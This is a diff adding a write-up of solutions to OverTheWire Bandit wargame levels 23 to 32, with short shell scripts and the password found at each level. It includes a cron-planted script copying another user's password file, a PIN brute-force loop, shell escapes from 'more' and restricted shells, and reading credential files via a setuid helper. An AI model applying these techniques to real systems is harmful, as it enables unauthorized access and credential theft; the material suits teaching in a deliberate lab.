@@ -201,4 +201,111 @@ cat /usr/bin/cronjob_bandit24.sh
 	    fi
 	done
 ```
+script.sh
+```sh
+#!/bin/bash
+
+cp /etc/bandit_pass/bandit24 /tmp/alexon2/
+chmod 777 /tmp/alexon2/bandit24
+```
+password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+## 24
+```sh
+#!/bin/bash
+
+task () {
+    result=$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $1" | nc -w 1 localhost 30002)
+    if [[ $result != *"Wrong"* ]]; then
+	    echo Found!
+	    echo $result > pass.txt
+	    echo $i >> pass.txt
+    fi
+}
+
+for i in $(seq -f "%04g" 8652 -1 0)
+do
+	echo $i
+	task $i &
+	sleep 0.5
+done
+```
+picode: 2648
+password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+## 25
+```sh
+cat /etc/passwd | grep bandit26
+	bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+cat /etc/bin/showtext
+	#!/bin/sh
+
+	export TERM=linux
+
+	more ~/text.txt
+	exit 0
+```
+`more` command enable paging only when terminal height is less that text length. To enable paging make change terminal size to 1 row.
+`v` command run vim for editting current file.
+`:set shell=/bin/bash`
+`:! bash`
+
+password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+## 26
+```sh
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
+password: 3ba3118a22e93127a4ed485be72ef5ea
+
+
+## 27
+```sh
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cat repo/README
+```
+password: 0ef186ac70e04ea33b4c1853d2526fa2
+
+## 28
+```sh
+git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+cd repo
+git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+cat README.md
+```
+
+password: bbc96594b4e001778eee9975372716b2
+
+## 29
+```
+git checkout dev
+cat README.md
+```
+
+password: 5b90576bedb2cc04c86a9e924ce42faf 
+
+## 30
+```sh
+git show secret
+```
+
+password: 47e603bb428404d265f59c42920d81e5
+
+
+## 31
+```sh
+echo 'May I come in?' > key.txt
+git add -f key.txt
+git commit -m "test"
+git push
+```
+password: 56a9bf19c63d650ce78e6ec0354ee45e
+
+## 32
+```sh
+$0
+```
+password: c9c3199ddf4121b10cf581a98d51caee
 
